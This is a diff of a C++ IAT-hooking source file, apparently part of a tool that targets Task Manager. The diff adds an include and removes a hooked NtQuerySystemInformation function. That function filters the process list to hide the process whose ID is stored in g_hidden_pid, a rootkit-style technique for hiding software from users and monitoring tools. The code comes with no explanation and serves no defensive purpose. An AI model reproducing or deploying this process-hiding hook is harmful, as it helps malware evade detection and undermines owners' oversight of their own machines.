@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include "IATHooking.hpp"
+#include "File.hpp"
 
 
 IATHooking::IATHooking::IATHooking(const std::string& module, const std::string & function_name, void * hook) :
@@ -12,7 +13,6 @@ IATHooking::IATHooking::IATHooking(const std::string& module, const std::string 
 	{
 		throw WindowsException();
 	}
-
 	auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(tsk_mgr_module);
 	auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(tsk_mgr_module + dos_header->e_lfanew);
 	auto import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(tsk_mgr_module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
@@ -75,39 +75,4 @@ IATHooking::IATHooking::~IATHooking()
 void * IATHooking::IATHooking::get_original_function()
 {
 	return _original_function;
-}
-
-NTSTATUS __stdcall IATHooking::HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
-{
-	auto status = reinterpret_cast<pNtQuerySystemInformation>(g_NtQuerySystemInformation_hook->get_original_function())(
-		SystemInformationClass,
-		SystemInformation,
-		SystemInformationLength,
-		ReturnLength);
-
-	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(status))
-	{
-		auto previous = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
-		auto current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);
-
-		while (previous->NextEntryOffset)
-		{
-			if ((int)(current->UniqueProcessId) == g_hidden_pid)
-			{
-				if (current->NextEntryOffset)
-				{
-					previous->NextEntryOffset += current->NextEntryOffset;
-				}
-				else
-				{
-					previous->NextEntryOffset = 0;
-				}
-			}
-
-			previous = current;
-			current = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<unsigned char*>(previous) + previous->NextEntryOffset);
-		}
-	}
-
-	return status;
 }
